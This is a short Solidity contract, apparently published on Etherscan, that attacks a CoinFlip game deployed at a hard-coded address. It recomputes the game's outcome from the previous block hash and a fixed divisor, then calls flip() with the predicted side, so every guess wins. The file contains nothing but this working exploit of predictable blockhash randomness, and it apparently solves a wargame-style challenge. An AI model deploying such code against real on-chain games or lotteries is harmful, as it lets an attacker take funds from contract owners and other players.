/**
 *Submitted for verification at Etherscan.io on 2021-11-17
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;


contract CoinFlip {
    function flip(bool) public returns (bool){}
}

contract hackCoinFlip {
    CoinFlip public originalContract = CoinFlip(0x01bed67930e4bFB0255a74714C785A709Ca9E094); 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;

    function hackFlip() public {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        
        if (lastHash == blockValue) {
          revert();
        }
    
        lastHash = blockValue;
        bool side = coinFlip == 1 ? true : false;
    
        originalContract.flip(side);
    }
}